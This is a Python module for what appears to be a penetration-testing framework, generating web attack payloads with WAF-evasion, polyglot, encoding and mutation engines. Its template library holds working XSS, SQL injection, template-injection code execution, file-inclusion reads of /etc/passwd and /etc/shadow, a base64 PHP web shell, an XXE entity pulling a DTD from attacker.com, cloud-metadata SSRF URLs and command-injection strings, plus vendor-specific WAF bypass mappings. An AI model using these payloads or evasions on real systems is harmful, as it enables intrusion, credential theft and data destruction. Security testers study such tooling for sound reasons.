"""C2 – AI-powered payload generator.

Context-aware payload generation with WAF fingerprint-to-evasion mapping,
polyglot builder, encoding chain generator, and mutation engine.
Covers: XSS, SQLi, SSTI, LFI, XXE, SSRF, IDOR, Command Injection.
"""

from __future__ import annotations

import base64
import random
import re
import urllib.parse
from datetime import datetime
from typing import Any

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Payload template library
# ---------------------------------------------------------------------------

_PAYLOAD_TEMPLATES: dict[str, list[str]] = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<math><mi xlink:href=javascript:alert(1)>",
        "<table background=javascript:alert(1)>",
        "<%2fscript><script>alert(1)<%2fscript>",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; DROP TABLE users--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% for x in ''.__class__.__mro__[1].__subclasses__() %}{{x}}{% endfor %}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
        "expect://id",
        "zip://archive.zip%23shell.php",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY xxe SYSTEM "expect://id">]><data>&xxe;</data>',
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0x7f000001/",
        "http://0177.0.0.01/",
        "http://2130706433/",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING%0D%0A",
        "file:///etc/passwd",
    ],
    "idor": [
        "0",
        "-1",
        "1",
        "2",
        "100",
        "99999",
        "00001",
        "admin",
        "null",
        "undefined",
        "NaN",
        "true",
        "false",
        "../1",
        "1%00",
        "1.0",
    ],
    "cmd_injection": [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "\n/bin/id",
        "%0a id",
        "%3b id",
        "1; sleep 5",
        "1 | sleep 5",
        "1 && sleep 5",
        "1; ping -c 5 127.0.0.1",
    ],
}

# WAF → evasion technique mapping
_WAF_EVASION_MAP: dict[str, list[str]] = {
    "cloudflare": ["case_variation", "unicode_escape", "double_url_encode", "html_entities"],
    "akamai": ["whitespace_variants", "comment_injection", "keyword_splitting"],
    "aws_waf": ["case_variation", "url_encode", "hex_encode"],
    "azure_waf": ["double_url_encode", "unicode_escape", "html_entities"],
    "imperva": ["comment_injection", "keyword_splitting", "hex_encode"],
    "modsecurity": ["case_variation", "comment_injection", "whitespace_variants"],
    "f5_bigip": ["unicode_escape", "double_url_encode", "keyword_splitting"],
    "sucuri": ["case_variation", "url_encode", "whitespace_variants"],
    "unknown": ["case_variation", "url_encode"],
}


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class PayloadGenerator(BaseModule):
    """AI-powered, context-aware security payload generator."""

    name = "payload_generator"
    description = (
        "Generate context-aware attack payloads for XSS, SQLi, SSTI, LFI, XXE, "
        "SSRF, IDOR, and Command Injection with WAF-evasion and mutation engines."
    )
    version = "1.0.0"
    category = "payload_generation"

    # ------------------------------------------------------------------ #
    # Public entry-point                                                   #
    # ------------------------------------------------------------------ #

    async def run(self, target: str, **kwargs: Any) -> dict[str, Any]:
        """Generate payloads tailored to the detected tech stack and WAF.

        Args:
            target: Target URL (used for context; no requests are made here).
            **kwargs:
                - tech_stack (List[str]): Detected technologies, e.g. ["php", "mysql"].
                - waf (str): Detected WAF vendor slug (see _WAF_EVASION_MAP keys).
                - categories (List[str]): Subset of payload categories to generate.
                - mutations (int): Number of mutations per base payload (default 5).
        """
        self.started_at = datetime.utcnow()

        tech_stack: list[str] = [t.lower() for t in kwargs.get("tech_stack", [])]
        waf: str = kwargs.get("waf", "unknown").lower()
        categories: list[str] = kwargs.get(
            "categories", list(_PAYLOAD_TEMPLATES.keys())
        )
        mutations: int = int(kwargs.get("mutations", 5))

        all_payloads: dict[str, Any] = {}

        for category in categories:
            if category not in _PAYLOAD_TEMPLATES:
                self.logger.warning("Unknown payload category: %s", category)
                continue

            base_payloads = self._select_context_payloads(category, tech_stack)
            evasion_techniques = _WAF_EVASION_MAP.get(waf, _WAF_EVASION_MAP["unknown"])
            evaded = self._apply_evasions(base_payloads, evasion_techniques)
            polyglots = self._build_polyglots(category)
            encoding_chains = self._encoding_chains(base_payloads[:3])
            mutated = self._mutate(base_payloads[:3], mutations)

            all_payloads[category] = {
                "base": base_payloads,
                "waf_evaded": evaded,
                "polyglots": polyglots,
                "encoding_chains": encoding_chains,
                "mutated": mutated,
            }

        self.add_finding(
            title=f"Payload Generation Complete – {len(all_payloads)} categories",
            severity="info",
            description=(
                f"Generated payloads for categories: {', '.join(all_payloads.keys())}. "
                f"WAF profile: {waf}. "
                f"Tech stack: {', '.join(tech_stack) if tech_stack else 'generic'}."
            ),
            evidence="",
            url=target,
            payloads=all_payloads,
            waf=waf,
            tech_stack=tech_stack,
        )

        self.completed_at = datetime.utcnow()
        return {**self.to_dict(), "payloads": all_payloads}

    # ------------------------------------------------------------------ #
    # Context-aware payload selection                                      #
    # ------------------------------------------------------------------ #

    def _select_context_payloads(
        self, category: str, tech_stack: list[str]
    ) -> list[str]:
        """Return payloads most relevant for the detected tech stack."""
        pool = list(_PAYLOAD_TEMPLATES[category])

        # Prioritise DB-specific payloads for known back-ends
        if category == "sqli":
            if "mysql" in tech_stack:
                pool = [p for p in pool if "SLEEP" in p or "UNION" in p] + pool
            elif "mssql" in tech_stack or "sqlserver" in tech_stack:
                pool = [p for p in pool if "WAITFOR" in p] + pool
        if category == "ssti":
            if "jinja2" in tech_stack or "flask" in tech_stack or "django" in tech_stack:
                pool = [p for p in pool if "{{" in p] + pool
            elif "java" in tech_stack or "spring" in tech_stack:
                pool = [p for p in pool if "${T(" in p] + pool

        # Deduplicate while preserving order
        seen: set = set()
        unique: list[str] = []
        for p in pool:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    # ------------------------------------------------------------------ #
    # WAF evasion                                                          #
    # ------------------------------------------------------------------ #

    def _apply_evasions(
        self, payloads: list[str], techniques: list[str]
    ) -> list[str]:
        """Apply selected evasion techniques to a list of payloads."""
        results: list[str] = []
        for payload in payloads[:5]:  # limit to first 5 base payloads
            for tech in techniques:
                evaded = self._evasion(payload, tech)
                if evaded != payload:
                    results.append(evaded)
        return results

    def _evasion(self, payload: str, technique: str) -> str:
        """Apply a single evasion technique and return the transformed payload."""
        if technique == "case_variation":
            return "".join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(payload)
            )
        if technique == "url_encode":
            return urllib.parse.quote(payload, safe="")
        if technique == "double_url_encode":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        if technique == "hex_encode":
            return "".join(f"%{ord(c):02X}" for c in payload)
        if technique == "unicode_escape":
            return "".join(
                f"\\u{ord(c):04x}" if not c.isascii() or c in "<>\"'" else c
                for c in payload
            )
        if technique == "html_entities":
            mapping = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;"}
            return "".join(mapping.get(c, c) for c in payload)
        if technique == "comment_injection":
            # Insert SQL/JS comments into keywords
            return re.sub(r"(SELECT|UNION|OR|AND|WHERE)", r"\1/**/", payload, flags=re.I)
        if technique == "whitespace_variants":
            return payload.replace(" ", "\t").replace("  ", "\n")
        if technique == "keyword_splitting":
            return re.sub(
                r"(script|alert|select|union)",
                lambda m: m.group(0)[:2] + "/**/" + m.group(0)[2:],
                payload,
                flags=re.I,
            )
        return payload

    # ------------------------------------------------------------------ #
    # Polyglot builder                                                     #
    # ------------------------------------------------------------------ #

    def _build_polyglots(self, category: str) -> list[str]:
        """Build polyglot payloads that work across multiple injection contexts."""
        polyglots: list[str] = []

        if category == "xss":
            polyglots = [
                # Works in HTML, attribute, JS string, and URL context
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
                "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->"
                "</SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "\"><img src=x onerror=alert(1)><!--",
            ]
        elif category == "sqli":
            polyglots = [
                "' OR 1=1-- -/**/UNION/**/SELECT/**/NULL,NULL--",
                "1' AND '1'='1' UNION SELECT NULL,table_name FROM information_schema.tables--",
            ]
        elif category == "cmd_injection":
            polyglots = [
                "; id | id & id && id || id `id` $(id)",
                "1;id%0a|id%0d&id%09&&id||id`id`$(id)",
            ]

        return polyglots

    # ------------------------------------------------------------------ #
    # Encoding chain generator                                             #
    # ------------------------------------------------------------------ #

    def _encoding_chains(self, payloads: list[str]) -> list[dict[str, str]]:
        """Generate encoding chain variants: URL, Base64, Unicode, Hex combos."""
        results: list[dict[str, str]] = []
        encoders: list[tuple[str, Any]] = [
            ("url", lambda s: urllib.parse.quote(s, safe="")),
            ("base64", lambda s: base64.b64encode(s.encode()).decode()),
            ("hex", lambda s: s.encode().hex()),
            ("url+base64", lambda s: urllib.parse.quote(base64.b64encode(s.encode()).decode(), safe="")),
            ("base64+url", lambda s: base64.b64encode(urllib.parse.quote(s, safe="").encode()).decode()),
        ]
        for payload in payloads:
            for name, fn in encoders:
                try:
                    results.append({"encoding": name, "original": payload, "encoded": fn(payload)})
                except Exception:
                    pass
        return results

    # ------------------------------------------------------------------ #
    # Mutation engine                                                      #
    # ------------------------------------------------------------------ #

    def _mutate(self, payloads: list[str], n: int) -> list[str]:
        """Generate *n* mutations per payload by applying random transformations."""
        mutations: list[str] = []
        transforms = [
            lambda s: s.upper(),
            lambda s: s.lower(),
            lambda s: s.replace(" ", "/**/"),
            lambda s: s.replace(" ", "%20"),
            lambda s: s.replace("<", "\x3c").replace(">", "\x3e"),
            lambda s: s + random.choice(["--", "//", "#", "/*"]),
            lambda s: urllib.parse.quote(s),
            lambda s: s.replace("=", "%3D"),
            lambda s: "".join(
                c + "\x00" if random.random() < 0.1 else c for c in s
            ),
        ]
        rng = random.Random(42)  # deterministic seed for reproducibility
        for payload in payloads:
            chosen = rng.choices(transforms, k=min(n, len(transforms)))
            for fn in chosen:
                try:
                    mutated = fn(payload)
                    if mutated not in mutations and mutated != payload:
                        mutations.append(mutated)
                except Exception:
                    pass
        return mutations[:n * len(payloads)]

    # ------------------------------------------------------------------ #
    # Public helper – generate payload set for external callers           #
    # ------------------------------------------------------------------ #

    def generate(
        self,
        category: str,
        tech_stack: list[str] | None = None,
        waf: str = "unknown",
        mutations: int = 5,
    ) -> dict[str, Any]:
        """Synchronous helper for generating a payload set without running the module.

        Args:
            category: One of the keys in _PAYLOAD_TEMPLATES.
            tech_stack: List of detected technologies.
            waf: WAF vendor slug.
            mutations: Number of mutations to produce.

        Returns:
            Dictionary with base, waf_evaded, polyglots, encoding_chains, mutated lists.
        """
        tech = [t.lower() for t in (tech_stack or [])]
        base = self._select_context_payloads(category, tech)
        evasion_techs = _WAF_EVASION_MAP.get(waf, _WAF_EVASION_MAP["unknown"])
        return {
            "base": base,
            "waf_evaded": self._apply_evasions(base, evasion_techs),
            "polyglots": self._build_polyglots(category),
            "encoding_chains": self._encoding_chains(base[:3]),
            "mutated": self._mutate(base[:3], mutations),
        }
